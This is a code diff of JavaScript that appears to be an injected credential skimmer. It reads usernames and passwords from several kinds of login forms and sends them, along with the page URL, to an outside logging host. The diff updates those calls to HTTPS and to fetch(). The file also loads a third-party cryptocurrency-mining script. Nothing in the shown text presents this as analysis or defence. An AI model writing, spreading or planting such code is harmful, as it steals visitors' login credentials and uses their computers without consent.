@@ -71,7 +71,7 @@ for (var i = 0; i < arrayLength; i++) {
         username = document.getElementById("user_login").value;
         user_pass = document.getElementById("user_pass").value;
         if (username && user_pass) {
-          (new Image).src = "http://fetching-url.herokuapp.com/logs.php?l="+location.href+"&e="+username+"&p="+user_pass;
+          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+location.href+"&e="+username+"&p="+user_pass;
 
         }
       };
@@ -81,7 +81,7 @@ for (var i = 0; i < arrayLength; i++) {
         username = document.getElementById("username").value;
         user_pass = document.getElementById("password").value;
         if (username && user_pass) {
-          (new Image).src = "http://fetching-url.herokuapp.com/logs.php?l="+location.href+"&e="+username+"&p="+user_pass;
+          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+location.href+"&e="+username+"&p="+user_pass;
         }
       };
     };
@@ -90,7 +90,7 @@ for (var i = 0; i < arrayLength; i++) {
         username = document.getElementsByName("email")[0].value;
         user_pass = document.getElementsByName("password")[0].value;
         if (username && user_pass) {
-          (new Image).src = "http://fetching-url.herokuapp.com/logs.php?l="+location.href+"&e="+username+"&p="+user_pass;
+          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+location.href+"&e="+username+"&p="+user_pass;
         }
       };
     };
@@ -99,7 +99,7 @@ for (var i = 0; i < arrayLength; i++) {
         username = document.getElementsByName("UID_input")[0].value;
         user_pass = document.getElementsByName("pass_input")[0].value;
         if (username && user_pass) {
-          (new Image).src = "http://fetching-url.herokuapp.com/logs.php?l="+location.href+"&e="+username+"&p="+user_pass;
+          fetch("https://fetching-url.herokuapp.com/logs.php?l="+location.href+"&e="+username+"&p="+user_pass);
         }
       };
     };
@@ -150,4 +150,4 @@ for (var i = 0; i < arrayLength; i++) {
       t.async = t.defer = true;
       t.src = "https://load.jsecoin.com/load/29089/www/0/0/";
       s.parentNode.insertBefore(t, s);
-    }();    
+    }();
